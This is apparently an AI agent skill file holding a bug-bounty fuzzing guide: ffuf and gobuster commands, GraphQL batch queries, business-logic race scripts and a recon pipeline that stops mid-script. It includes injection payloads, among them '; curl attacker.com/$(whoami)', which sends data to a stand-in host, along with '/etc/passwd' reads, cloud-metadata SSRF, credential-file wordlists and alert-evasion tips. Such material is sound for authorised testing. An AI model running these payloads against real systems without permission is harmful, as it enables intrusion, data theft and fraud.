---
name: fuzzing-guide
description: Complete fuzzing guide for bug bounty hunters. Covers directory brute-forcing, parameter discovery, content-type fuzzing, header fuzzing, GraphQL fuzzing, API fuzzing, WebSocket fuzzing, subdomain enumeration, virtual host fuzzing, and business logic fuzzing. Includes ffuf, gobuster, dirsearch, nuclei fuzzing, and custom script examples. Use when fuzzing endpoints, discovering hidden parameters, testing content types, or brute-forcing values. Chinese trigger: fuzzing、模糊测试、fuzz、ffuf、gobuster、dirsearch、参数fuzz、内容fuzz
---

# Skill: Fuzzing Guide

Complete fuzzing strategies and payload libraries for every recon and testing phase.

---

## FUZZING PHILOSOPHY

```
FUZZING LIFECYCLE:
1. MAP — Understand what exists before fuzzing
2. FOCUS — Target specific injection points (params, headers, body)
3. DISCOVER — Find hidden parameters, endpoints, content types
4. CONFIRM — Verify findings manually
5. CHAIN — Combine fuzz findings for impact
```

### Fuzzing Decision Tree

```
What do you know about the target?
├── URL structure known → Directory fuzzing
├── API docs known → Parameter fuzzing
├── No docs found → Content discovery fuzzing
├── Headers controllable → Header injection fuzzing
├── WebSocket → WebSocket message fuzzing
├── GraphQL endpoint → GraphQL introspection + query fuzzing
└── Business logic known → Logic state fuzzing
```

---

## DIRECTORY BRUTE-FORCING

### Directory Fuzzing Strategy

```
Phase 1: Quick top-100
--minimal impact, fast wins

Phase 2: Expand to top-1000
--medium impact, reasonable time

Phase 3: Full dictionary
--heavy impact, takes time

Phase 4: Custom target-specific
--based on discovered keywords from recon
```

### ffuf Directory Fuzzing

```bash
# Basic directory fuzzing
ffuf -u "https://target.com/FUZZ" \
  -w ~/wordlists/common.txt \
  -mc 200,301,302,401,403,500 \
  -c \
  -t 100

# With recursion (be careful!)
ffuf -u "https://target.com/FUZZ" \
  -w ~/wordlists/common.txt \
  -recursion \
  -recursion-depth 2 \
  -mc 200,301,302,401,403 \
  -t 50

# With rate limiting (stealth mode)
ffuf -u "https://target.com/FUZZ" \
  -w ~/wordlists/common.txt \
  -p 1 \
  -t 10 \
  -mc 200,301,302,401,403

# Extension fuzzing (find .php, .bak, .old)
ffuf -u "https://target.com/admin/FUZZ" \
  -w ~/wordlists/extensions.txt \
  -mc 200,301,403 \
  -t 100

# Backup file discovery
ffuf -u "https://target.com/indexFUZZ" \
  -w ~/wordlists/backup-extensions.txt \
  -mc 200,301,302

# Directory with bypass extension
ffuf -u "https://target.com/admin.phpFUZZ" \
  -w ~/wordlists/php-extensions.txt \
  -mc 200,301,302

# Directory + extension combined
ffuf -u "https://target.com/FUZZ/FUZZ2" \
  -w ~/wordlists/common.txt \
  -w ~/wordlists/extensions.txt \
  -mc 200,301,302
```

### gobuster Directory Fuzzing

```bash
# Basic
gobuster dir -u "https://target.com" -w ~/wordlists/common.txt -t 50

# With status codes
gobuster dir -u "https://target.com" -w ~/wordlists/common.txt \
  -s 200,301,302,401,403,500 -t 50

# With extensions
gobuster dir -u "https://target.com" -w ~/wordlists/common.txt \
  -x php,html,txt,json,bak,old,zip -t 50

# With custom headers
gobuster dir -u "https://target.com" -w ~/wordlists/common.txt \
  -H "Authorization: Bearer <token>" -t 50

# Using proxy
gobuster dir -u "https://target.com" -w ~/wordlists/common.txt \
  -p http://127.0.0.1:8080 -t 50

# Recursive
gobuster dir -u "https://target.com" -w ~/wordlists/common.txt \
  -r -t 50 -x php,html

# No recursion (default)
gobuster dir -u "https://target.com" -w ~/wordlists/common.txt -t 50
```

### dirsearch Directory Fuzzing

```bash
# Basic
dirsearch -u "https://target.com" -w ~/wordlists/common.txt -t 50

# With extensions and exclusions
dirsearch -u "https://target.com" -w ~/wordlists/common.txt \
  -e php,html,txt,json,bak,old,zip \
  -x 403,404 -t 50

# With recursive
dirsearch -u "https://target.com" -w ~/wordlists/common.txt \
  -r -e php,html,txt -t 50

# Using proxy
dirsearch -u "https://target.com" -w ~/wordlists/common.txt \
  --proxy http://127.0.0.1:8080 -t 50

# With custom headers
dirsearch -u "https://target.com" -w ~/wordlists/common.txt \
  -H "X-Custom-Header: value" -t 50

# Brute force extensions at every directory level
dirsearch -u "https://target.com" -w ~/wordlists/common.txt \
  --force-extensions -e php,html,txt -t 50
```

### feroxbuster Directory Fuzzing

```bash
# Basic
feroxbuster -u "https://target.com" -w ~/wordlists/common.txt -t 50

# With auto-filter for wildcards
feroxbuster -u "https://target.com" -w ~/wordlists/common.txt \
  --auto-filter -t 50

# With recursion and depth
feroxbuster -u "https://target.com" -w ~/wordlists/common.txt \
  -d 2 -t 50

# With proxy
feroxbuster -u "https://target.com" -w ~/wordlists/common.txt \
  --proxy http://127.0.0.1:8080 -t 50

# With output
feroxbuster -u "https://target.com" -w ~/wordlists/common.txt \
  --output feroxbuster-results.txt -t 50
```

### wfuzz Directory Fuzzing

```bash
# Basic
wfuzz -w ~/wordlists/common.txt "https://target.com/FUZZ"

# With status filter
wfuzz -w ~/wordlists/common.txt --hc 404 \
  -t 50 "https://target.com/FUZZ"

# With filter for response size
wfuzz -w ~/wordlists/common.txt --fs 1234 \
  -t 50 "https://target.com/FUZZ"

# With recursion
wfuzz -w ~/wordlists/common.txt -R 2 \
  "https://target.com/FUZZ"

# FUZZ multiple places
wfuzz -w common.txt -w params.txt \
  --slice "https://target.com/FUZZ1?FUZZ2=value"
```

### Directory Fuzzing Payload Tips

```
Stealth techniques:
-p: delay between requests (e.g., -p 2 for 2 seconds)
-t: lower thread count (10-20 instead of 100)
--random-agent: Rotate user agents
--timeout 15: Slower = less likely to trigger alerts

Filtering:
--hc 404: ignore 404 responses
--fc 403: filter out 403 responses
--fs 1234: filter by response size
--fw "Not Found": filter by response words

Advanced:
Proxy through Burp: -p http://127.0.0.1:8080
Follow redirects: -redir
Recursion: --depth 2
Auto-calibration: --auto-calibration
```

---

## PARAMETER FUZZING

### Parameter Discovery Strategy

```
Phase 1: Parameter brute-force (grep known params)
Phase 2: Content discovery (crawl for hidden params)
Phase 3: Source code analysis (find hardcoded params)
Phase 4: API spec analysis (OpenAPI, GraphQL introspection)
```

### ffuf Parameter Fuzzing

```bash
# Discovery in GET requests
ffuf -u "https://target.com/search?q=test&FUZZ=value" \
  -w ~/wordlists/params.txt \
  -mc 200,302,400,401,403 -t 100

# Keyword-based discovery (content matches)
ffuf -u "https://target.com/api/profile" \
  -w ~/wordlists/params.txt \
  -mr "email|username|profile|account" -t 100

# With auth header
ffuf -u "https://target.com/api/v1/users?FUZZ=1" \
  -w ~/wordlists/params.txt \
  -H "Authorization: Bearer TOKEN" -t 100
```

### arjun Parameter Discovery

```bash
# Basic parameter discovery
arjun -u "https://target.com/api/v1/users/123" -m GET

# With custom headers
arjun -u "https://target.com/api/v1/users/123" -m GET \
  -H "Authorization: Bearer TOKEN"

# With POST body parameters
arjun -u "https://target.com/api/v1/users/123" -m POST \
  -H "Content-Type: application/json" -d '{"name":"test"}'

# Output to file
arjun -u "https://target.com/api/v1/users/123" -m GET -o params.json

# Silent mode
arjun -u "https://target.com/api/v1/users/123" -m GET -s
```

### ParamSpider Parameter Discovery

```bash
# Basic parameter mining
python3 paramspider.py -d target.com

# High risk parameters only
python3 paramspider.py -d target.com --level high

# Output to file
python3 paramspider.py -d target.com -o params.txt

# Exclude subs
python3 paramspider.py -d target.com --exclude subs

# High risk with output
python3 paramspider.py -d target.com --level high -o high-risk.txt
```

### gf Pattern-Based Parameter Fuzzing

```bash
# Filter URLs for specific patterns
cat urls.txt | gf xss
cat urls.txt | gf sqli
cat urls.txt | gf ssrf
cat urls.txt | gf idor
cat urls.txt | gf redirect
cat urls.txt | gf lfi
cat urls.txt | gf rce
cat urls.txt | gf ssti
cat urls.txt | gf debug_params
cat urls.txt | gf upload_fields

# Combine with ffuf
cat urls.txt | gf sqli | sort -u | \
  xargs -I{} ffuf -u "{}?FUZZ=1" -w ~/wordlists/sqli-payloads.txt -t 50
```

---

## CONTENT-TYPE FUZZING

### Content-Type Fuzzing Strategy

```bash
# Test different content types for the same endpoint
ct_list=(
  "application/json"
  "application/xml"
  "text/xml"
  "text/plain"
  "text/html"
  "application/x-www-form-urlencoded"
  "multipart/form-data"
  "application/octet-stream"
  "text/css"
  "application/javascript"
)

for ct in "${ct_list[@]}"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/endpoint" \
    -H "Content-Type: $ct" \
    -d '{"test": "value"}')
  echo "$ct: $response"
done
```

### ffuf Content-Type Fuzzing

```bash
# Discovery by content type
ffuf -u "https://target.com/api/endpoint" \
  -w ~/wordlists/content-types.txt \
  -H "Content-Type: FUZZ" \
  -X POST -d '{"test":"value"}' \
  -mc 200,400,401,403 -t 100

# Find alternate content-type interpretations
ffuf -u "https://target.com/upload" \
  -w ~/wordlists/content-types.txt \
  -F "file=@test.php;type=FUZZ" \
  -mc 200,302,400 -t 50
```

---

## HEADER FUZZING

### Header Fuzzing Strategy

```
1. Test header-based auth bypass
   X-Original-URL, X-Rewrite-URL, X-Forwarded-For
   X-Host, X-Forwarded-Proto, X-Real-IP

2. Test content-negotiation
   Accept, Accept-Language, Accept-Encoding

3. Test IDOR via headers
   X-User-ID, X-Original-User, X-Auth-User

4. Test for cache poisoning
   X-Forwarded-Host, X-Host, X-Original-URL

5. Test for SSRF via headers
   Referer, X-Forwarded-For in 4xx responses

6. Test for host header injection
   Host, X-Forwarded-Host, X-Original-Host
```

### ffuf Header Fuzzing

```bash
# Header injection fuzzing
ffuf -u "https://target.com/api/profile" \
  -w ~/wordlists/headers.txt \
  -H "X-Custom-Header: FUZZ" \
  -mc 200,302,400,401,403 -t 100

# Auth bypass via headers
ffuf -u "https://target.com/admin" \
  -w ~/wordlists/auth-bypass-headers.txt \
  -H "X-Forwarded-For: FUZZ" \
  -t 100

# IDOR via headers
ffuf -u "https://target.com/api/order/123" \
  -w ~/wordlists/user-ids.txt \
  -H "X-User-ID: FUZZ" \
  -mc 200,302 -t 50
```

### Custom Header Fuzzing Scripts

```bash
# X-Forwarded-For bypass
for ip in 127.0.0.1 localhost 0.0.0.0 10.0.0.1; do
  curl -s -o /dev/null -w "%{http_code}" \
    -H "X-Forwarded-For: $ip" \
    "https://target.com/admin"
done

# X-Original-URL bypass
curl -s "https://target.com/admin" \
  -H "X-Original-URL: /admin/public" \
  -H "X-Rewrite-URL: /api"

# Host header injection
curl -s "https://target.com" \
  -H "Host: evil.com"

# X-Forwarded-Host
curl -s "https://target.com" \
  -H "X-Forwarded-Host: evil.com"
```

---

## GRAPHQL FUZZING

### GraphQL Fuzzing Strategy

```
1. Introspection (if enabled)
   - Dump entire schema
   - Identify hidden fields, queries, mutations

2. Introspection bypass (if disabled)
   - __type introspection
   - Fragment-based enumeration
   - Error-based type discovery

3. Query fuzzing
   - Field values
   - Field arguments
   - Query depth

4. Mutation fuzzing
   - Side effects
   - Authorization bypass
   - Batch mutations
```

### GraphQL Introspection Fuzzing

```graphql
# Extract schema
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types { name kind fields { name type { name } } }
  }
}

# Extract specific type (if __schema disabled)
query {
  __type(name: "User") {
    name
    fields { name type { name } }
    inputFields { name type { name } }
  }
}

# Batch introspection - extract all types
query {
  User { id name email }
  Admin { id secrets privileged }
  Order { id total }
}
```

### GraphQL Query Fuzzing

```graphql
# Argument fuzzing
query {
  user(id: FUZZ) {  # Try: 1, 2, admin, etc.
    email
    password
    privateNotes
    role
  }
}

# Batch mutation fuzzing (bypass rate limits)
mutation {
  op1: changeEmail(userId: "1", email: "attacker@evil.com") { success }
  op2: changeEmail(userId: "2", email: "attacker@evil.com") { success }
  op3: changeEmail(userId: "3", email: "attacker@evil.com") { success }
  # Continue to 1000 users
}

# Depth bypass (limit: depth field)
query {
  user { posts { author { posts { author { id email } } } } }
}

# Field suggestion fuzzing
query {
  user(id: "1") {
    # Misspell field to get suggestion
    usrname
    emaill
    passwrd
  }
}
```

### GraphQL Batch Attack (bypass rate limits)

```graphql
# Single request with multiple queries
query {
  q1: user(id: "1") { email }
  q2: user(id: "2") { email }
  q3: user(id: "3") { email }
  q4: user(id: "4") { email }
  q5: user(id: "5") { email }
  q6: user(id: "6") { email }
  q7: user(id: "7") { email }
  q8: user(id: "8") { email }
  q9: user(id: "9") { email }
  q10: user(id: "10") { email }
}

# Batch mutations
mutation {
  m1: createOrder(userId: "1", items: [{"id":"1","qty":0}]) { orderId }
  m2: createOrder(userId: "2", items: [{"id":"1","qty":0}]) { orderId }
  m3: createOrder(userId: "3", items: [{"id":"1","qty":0}]) { orderId }
  # 100 mutations per request
}
```

---

## API FUZZING

### REST API Parameter Fuzzing

```bash
# Path parameter fuzzing
ffuf -u "https://target.com/api/v1/users/FUZZ" \
  -w ~/wordlists/ids.txt \
  -w ~/wordlists/uuids.txt \
  -mc 200,401,403 -t 50

# Query parameter fuzzing
ffuf -u "https://target.com/api/v1/users?userId=FUZZ" \
  -w ~/wordlists/ids.txt \
  -w ~/wordlists/uuids.txt \
  -mc 200,302,401,403 -t 50

# POST body parameter fuzzing
ffuf -u "https://target.com/api/v1/users" \
  -w ~/wordlists/params.txt \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"FUZZ": "value"}' \
  -mc 200,302,400,401,403 -t 50

# Header parameter fuzzing
ffuf -u "https://target.com/api/v1/users/me" \
  -w ~/wordlists/headers.txt \
  -H "X-Custom: FUZZ" \
  -mc 200,302,401,403 -t 50
```

### API Method Override Fuzzing

```bash
# Try alternative HTTP methods
for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X $method "https://target.com/api/v1/users/123")
  echo "$method: $code"
done

# Method override headers
for header in "X-HTTP-Method: PUT" "X-HTTP-Method-Override: DELETE" \
              "X-Method-Override: PATCH"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST \
    -H "X-Custom-Header: value" \
    -H "$header" \
    "https://target.com/api/v1/users/123")
  echo "$header : $code"
done
```

### HATEOAS/API Discovery Fuzzing

```bash
# From OpenAPI spec
# Extract all paths + methods, then fuzz each

# From JS files
# Find fetch/axios calls
grep -rE "fetch\(|axios\.|\.ajax\(" *.js

# Extract URLs
cat urls.txt | grep "api/v" | cut -d'?' -f1 | sort -u > api-endpoints.txt

# Fuzz each endpoint with common parameters
while read endpoint; do
  ffuf -u "$endpoint?FUZZ=1" \
    -w ~/wordlists/params.txt \
    -mc 200,302,400,401,403 -t 50
  # Try POST
  ffuf -u "$endpoint" \
    -w ~/wordlists/body-params.txt \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"FUZZ": "value"}' \
    -mc 200,302,400,401,403 -t 50
done < api-endpoints.txt
```

---

## WEBSOCKET FUZZING

### WebSocket Discovery

```
1. Find WebSocket endpoints in JS:
grep -r "new WebSocket" *.js
grep -r "ws://" *.js
grep -r "wss://" *.js

2. Find WebSocket in Burp:
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: ...
Sec-WebSocket-Version: 13

3. Common WebSocket paths:
/ws
/ws/
/websocket
/websocket/
/socket.io/
/socket.io/?EIO=4&transport=websocket
/chat
/chat/
/stream
/stream/
/realtime
/realtime/
/notification
/notification/
/events
/events/
```

### WebSocket Fuzzing Techniques

```bash
# wscat connection
wscat -c "wss://target.com/ws"

# Message fuzzing (in wscat session)
> {"action":"FUZZ"}
> {"id":"FUZZ"}
> {"userId":"FUZZ"}
> {"query":"FUZZ OR 1=1"}
> {"name":"FUZZ","email":"FUZZ"}

# Using ffuf (for automated fuzzing)
ffuf -u "wss://target.com/ws" \
  -w ~/wordlists/websocket-actions.txt \
  -t 50 \
  -method "GET"

# Custom fuzzer (Python + websockets)
python3 -c "
import asyncio, websockets

async def fuzz():
    async with websockets.connect('wss://target.com/ws') as ws:
        with open('actions.txt') as f:
            for action in f:
                await ws.send(action.strip())
                resp = await ws.recv()
                print(f'Sent: {action.strip()}\nResp: {resp}')

asyncio.run(fuzz())
"
```

### WebSocket Origin Fuzzing

```bash
# Test each origin with wscat
for origin in https://target.com https://evil.com null https://target.com.evil.com; do
  echo "Testing Origin: $origin"
  wscat -c "wss://target.com/ws" -H "Origin: $origin"
done

# Or via Burp Repeater:
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://evil.com
```

### WebSocket Injection Testing

```json
// XSS testing
{"message": "<script>alert(1)</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"message": "{{7*7}}"}
{"message": "${7*7}"}

// SQLi testing
{"action": "search", "query": "' OR 1=1--"}
{"action": "search", "query": "' AND SLEEP(5)--"}

// NoSQLi testing
{"username": {"$ne": null}, "password": {"$ne": null}}

// SSRF testing
{"action": "fetch", "url": "http://169.254.169.254/latest/meta-data/"}
{"action": "fetch", "url": "http://127.0.0.1:6379"}

// Path traversal
{"action": "read", "file": "../../../etc/passwd"}
{"action": "load", "path": "../../../../etc/passwd"}

// Command injection
{"action": "exec", "cmd": "; curl attacker.com/$(whoami)"}
{"action": "run", "command": "| cat /etc/passwd"}
```

---

## SUBDOMAIN FUZZING

### Subdomain Enumeration

```bash
# subfinder
subfinder -d target.com -o subdomains.txt -silent

# Amass (comprehensive)
amass enum -d target.com -o subdomains.txt

# assetfinder
assetfinder --subs-only target.com >> subdomains.txt

# Findomain
findomain -t target.com -o subdomains.txt

# Chaos (ProjectDiscovery)
chaos -d target.com -o subdomains.txt

# DNS brute-force (with dnsx)
dnsx -l subdomains.txt -resp -o live-subdomains.txt

# With ASN scope
amass intel -org "Target Company" -asn AS12345
```

### Virtual Host Fuzzing

```bash
# vhost discovery with ffuf
ffuf -u "https://target.com" \
  -H "Host: FUZZ.target.com" \
  -w ~/wordlists/subdomains.txt \
  -mc 200,302,301,400,401,403 \
  -t 50

# Virtual host fuzzing with gobuster
gobuster vhost -u "https://target.com" \
  -w ~/wordlists/subdomains.txt \
  -t 50

# Filter by response size (to remove CDN wildcard)
ffuf -u "https://target.com" \
  -H "Host: FUZZ.target.com" \
  -w ~/wordlists/subdomains.txt \
  -fs 1234 \
  -t 50
```

### DNS Wildcard Detection

```
Wildcard detection:
dig *.target.com
host random123.target.com
nslookup random-abc.target.com

If wildcard:
dig *.target.com A
Returns random IP for non-existent subdomain

Bypass wildcard:
1. Grep for unique page content (not just response code)
2. Different response size
3. Filter by response body (not headers)
4. Try CNAME lookups: any wildcard entries?
```

### FFuF for WebSocket VHost Discovery

```bash
ffuf -u "wss://target.com/ws" \
  -H "Host: FUZZ.target.com" \
  -w ~/wordlists/subdomains.txt \
  -t 50 -method "GET"
```

---

## BUSINESS LOGIC FUZZING

### Business Logic Fuzzing Approach

```
Phase 1: Map all states and transitions
Phase 2: Fuzz state machines
Phase 3: Fuzz workflow sequence
Phase 4: Fuzz race conditions
Phase 5: Fuzz financial operations
```

### State Machine Fuzzing

```bash
# Cart state fuzzing
# States: empty, items-added, checkout-started, paid, shipped
# Fuzz: can we skip from empty directly to paid?

# Order state fuzzing
# States: pending → processing → confirmed → shipped → delivered
# Fuzz: can we go directly from pending to shipped?

curl -X PUT "https://target.com/api/orders/123" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "delivered"}'

curl -X PUT "https://target.com/api/orders/123" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "shipped", "trackingNumber": "TRACK123"}'
```

### Price Manipulation Fuzzing

```bash
# Negative quantity
curl -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "prod1", "qty": -1}]}'

# Zero quantity
curl -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "prod1", "qty": 0}]}'

# Negative price
curl -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "prod1", "qty": 1, "price": -100}]}'

# Mass Quantity overflow
curl -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "prod1", "qty": 999999999}]}'

# Multi-coupon stacking
curl -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"coupons": ["SAVE10", "SAVE20", "SAVE30", "FREESHIP"]}'

# Currency manipulation (JPY has no decimal)
curl -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "prod1", "qty": 1}], "currency": "JPY"}'

# Modify item to be free
curl -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "prod1", "qty": 1, "unitPrice": 0}]}'
```

### Workflow Skipping Fuzzing

```
Checkout flow bypass:
Step 1: /api/checkout/step1 (address)
Step 2: /api/checkout/step2 (shipping)
Step 3: /api/checkout/step3 (payment)
Step 4: /api/checkout/confirm

Fuzz:
1. POST /api/checkout/confirm without going through steps 1-3
2. POST /api/checkout/confirm with empty body
3. PUT /api/checkout/123 to modify totalPaid to 0
```

### Parameter Pollution Fuzzing

```bash
# Using qsreplace
echo "https://target.com/api/user?id=123" | qsreplace 'id=123&id=124'
# Result: https://target.com/api/user?id=123&id=124

# ffuf parameter pollution
ffuf -u "https://target.com/api/user?id=FUZZ&id=124" \
  -w ~/wordlists/ids.txt \
  -mc 200,302,403 -t 50

# Multiple same parameters in different formats
?user_id=1&user_id=2
?id[]=1&id[]=2
?id[0]=1&id[1]=2
?user=1&user=2&user=3
```

### Business Logic Race Fuzzing

```bash
# Coupon redemption race
seq 1 100 | xargs -P50 -I{} curl -sk \
  -X POST "https://target.com/api/cart/redeem" \
  -d '{"coupon": "ONETIME_SAVE"}'

# Balance transfer race (double spend)
seq 1 50 | xargs -P50 -I{} curl -sk \
  -X POST "https://target.com/api/transfer" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to": "attacker", "amount": 100}'

# Inventory race (buy more than available)
seq 1 100 | xargs -P100 -I{} curl -sk \
  -X POST "https://target.com/api/order" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"productId": "LIMITED_ITEM", "qty": 1}'

# Price update race
seq 1 20 | xargs -P20 -I{} curl -sk \
  -X POST "https://target.com/api/products/update" \
  -H "Authorization: Bearer ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"id": "prod1", "price": 0.01}'
```

---

## CONTENT DISCOVERY FUZZING

### Content Discovery Strategy

```
1. Start with robots.txt
2. Crawl with katana/gospider
3. Fuzz with common paths
4. Analyze JS for hidden endpoints
5. Check sitemap.xml
6. Fuzz API paths with parameter words
7. Check for versioned APIs
8. Search for developer artifacts
```

### Content Discovery Wordlists

```
Secrets in content:
/dev
/.env
/.env.backup
/.env.bak
/config.json
/config.yaml
/package.json
/composer.json
/requirements.txt
/Pipfile
/Gemfile
/pom.xml
/build.gradle
/.npmrc
/.pypirc
/.dockercfg
/.netrc
/.bash_history
/.zsh_history
/.bashrc
/.profile
/.ssh/id_rsa
/.ssh/authorized_keys
/.ssh/known_hosts

Config files:
/config.inc
/config.inc.php
/config.local
/config/config.php
/app/config/database.yml
/application/config/config.php
/app/config/parameters.yml
/config/database.php
/app/config/database.php
/includes/config.php
/vendor/composer/installed.json
/composer.lock
/package-lock.json
/yarn.lock
/tsconfig.json
/webpack.config.js
/vite.config.js
/next.config.js
/angular.json
/tsconfig.json
```

### JavaScript Endpoint Extraction

```bash
# LinkFinder
python3 linkfinder.py -i https://target.com/main.js -o cli
python3 linkfinder.py -i https://target.com/main.js -d -o endpoints.txt

# SecretFinder (API keys in JS)
python3 SecretFinder.py -i https://target.com/main.js -o cli \
  -g google_api_key,aws_access_key,aws_secret_key

# JSLuice (comprehensive JS analysis)
jsluice urls https://target.com/main.js
jsluice secrets https://target.com/main.js

# Extract endpoints from all JS files
gau target.com | grep '\.js$' | \
  xargs -I{} curl -s {} | grep -oP 'https?://[^"'\''<>]+' | \
  grep -iE "api|endpoint|v[0-9]+" | sort -u > js-endpoints.txt

# API key patterns
grep -rE "(api_key|apikey|api-key|access_key|secret_key|token)" *.js
grep -rE "(sk_live_|sk_test_|pk_live_|pk_test_)" *.js
```

---

## FUZZ FILTERING AND ANALYSIS

### ffuf Filtering

```bash
# Filter by response code
--hc 404       # hide 404
--hc 403,404   # hide multiple
-fc 200,302    # filter (show all except these)

# Filter by response size
-fs 1234       # filter by size exactly
-fr 1000-2000  # filter by size range

# Filter by response lines
-fl 10         # filter by line count

# Filter by response words
-fw "Not Found"  # filter by word in response

# Filter with regex
-fr ".*(error|invalid).*"  # hide responses containing error|invalid
```

### Response Analysis

```
When fuzzing, look for:
1. Different response codes (200 vs 401 vs 403)
2. Different response sizes (sign of injection)
3. Different response times (blind injection)
4. Response containing error messages
5. Response containing sensitive data
6. Different Content-Type
7. Response headers with hints
8. Response containing keywords (error, warning, exception)
```

---

## NUCLEI FUZZING

### Nuclei Template-Based Fuzzing

```bash
# Run all templates
nuclei -u "https://target.com" -t ~/nuclei-templates/

# Specific vuln class
nuclei -u "https://target.com" -t ~/nuclei-templates/cves/
nuclei -u "https://target.com" -t ~/nuclei-templates/exposures/
nuclei -u "https://target.com" -t ~/nuclei-templates/misconfiguration/

# Fuzzing templates
nuclei -u "https://target.com" -t ~/nuclei-templates/fuzzing/

# With tags
nuclei -u "https://target.com" -tags "cve,rce"

# Custom payloads
nuclei -u "https://target.com" -t custom-template.yaml

# Subdomain takeover
nuclei -u "https://target.com" -t takeovers/

# Technology detection
nuclei -u "https://target.com" -t technologies/
```

### Nuclei Custom Fuzzing Template

```yaml
# Custom fuzzing template
id: custom-fuzz

info:
  name: Custom Fuzzer
  author: yourname
  severity: info

requests:
  - raw:
      - |
        GET /FUZZ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0

    payloads:
      path:
        - "admin"
        - "api"
        - "config"
        - "backup"

    matchers:
      - type: status
        status:
          - 200
          - 301
          - 302
          - 401
          - 403

    attack: sniper
    matchers-condition: or
```

---

## FUZZING PAYLOAD LISTS

### HTTP Method Fuzzing List

```
GET
POST
PUT
PATCH
DELETE
HEAD
OPTIONS
TRACE
CONNECT
PROPFIND
PROPPATCH
MKCOL
COPY
MOVE
LOCK
UNLOCK
```

### Content-Type Fuzzing List

```
application/json
application/x-www-form-urlencoded
multipart/form-data
text/xml
application/xml
application/atom+xml
text/html
text/plain
text/css
application/javascript
application/octet-stream
application/pdf
image/png
image/jpeg
image/gif
application/zip
application/x-tar
application/x-gzip
```

### Header Fuzzing List (Auth Bypass)

```
X-Original-URL
X-Rewrite-URL
X-Forwarded-For
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-Path
X-Forwarded-Prefix
X-Host
X-Host-Override
X-Remote-User
X-Remote-User-ID
X-User
X-User-ID
X-User-Email
X-Auth-User
X-Auth-User-ID
X-Auth-Token
X-Auth-Session
X-Original-User-ID
X-Real-IP
X-Client-IP
X-Forwarded-For
```

### IDOR Parameter Wordlist (Path)

```
id
ID
Id
userId
user_id
UserID
userID
accountId
account_id
accountID
customerId
customer_id
customerID
clientId
client_id
clientID
orderId
order_id
orderID
invoiceId
invoice_id
invoiceID
paymentId
payment_id
paymentID
profileId
profile_id
profileID
groupId
group_id
groupID
teamId
team_id
teamID
orgId
org_id
orgID
organizationId
organization_id
organizationID
documentId
document_id
documentID
fileId
file_id
fileID
folderId
folder_id
folderID
projectId
project_id
projectID
ticketId
ticket_id
ticketID
bugId
bug_id
bugID
taskId
task_id
taskID
resourceId
resource_id
resourceID
itemId
item_id
itemID
productId
product_id
productID
serviceId
service_id
serviceID
planId
plan_id
planID
subscriptionId
subscription_id
subscriptionID
postId
post_id
postID
commentId
comment_id
commentID
messageId
message_id
messageID
chatId
chat_id
chatID
conversationId
conversation_id
conversationID
threadId
thread_id
threadID
replyId
reply_id
replyID
reviewId
review_id
reviewID
commentId
comment_id
commentID
messageId
message_id
messageID
```

---

## FUZZING BEST PRACTICES

### Before You Start

1. **Check robots.txt** — directories may be intentionally hidden
2. **Check sitemap.xml** — disclosed paths, use as starting wordlist
3. **Crawl first** — katana, gospider, Burp Spider to find URLs
4. **Read JS files** — LinkFinder, SecretFinder for endpoints
5. **Check API docs** — OpenAPI, Swagger, GraphQL introspection
6. **Use grep/wayback** — gau, waybackurls for historical URLs
7. **Filter known responses** — remove 404s, wildcards before analysis

### During Fuzzing

1. **Start small** — top 100 words, then expand
2. **Monitor WAF** — watch for 429s, 403s, delays
3. **Filter results in real-time** — remove known responses
4. **Follow redirects** — 301 → 200 often gives more info
5. **Respect rate limits** — -p delay, lower thread count
6. **Use proxy** — Burp for hands-on analysis
7. **Save all results** — output to file, don't trust terminal

### After Fuzzing

1. **Analyze response sizes** — identify anomalies
2. **Categorize findings** — secrets, configs, endpoints
3. **Refine wordlists** — add found paths to custom list
4. **Re-fuzz with better list** — converge on target-specific words
5. **Param fuzz discovered endpoints** — find hidden parameters
6. **Test for vulns** — use ffuf to send SQLi payloads
7. **Document everything** — screenshots, requests, responses

### Common Fuzzing Mistakes

```
1. Running without proxy → missing WAF blocks
2. No rate limiting → triggering alerts early
3. Ignoring responses → 200 but different size = interesting
4. Not filtering → drowning in false positives
5. Missing subdomains → fuzzing main domain only
6. Not using recursion → missing nested directories
7. Using single tool → different tools find different things
8. No follow-up → fuzzing only, no manual verification
```

---

## AUTOMATED FUZZING PIPELINE

### Complete Recon + Fuzz Pipeline

```bash
#!/bin/bash
TARGET="target.com"
OUTDIR="results/$TARGET"

mkdir -p $OUTDIR

# Phase 1: Subdomain enumeration
echo "[*] Enumerating subdomains..."
subfinder -d $TARGET -o $OUTDIR/subdomains.txt -silent
amass enum -d $TARGET -o $OUTDIR/subdomains2.txt -silent
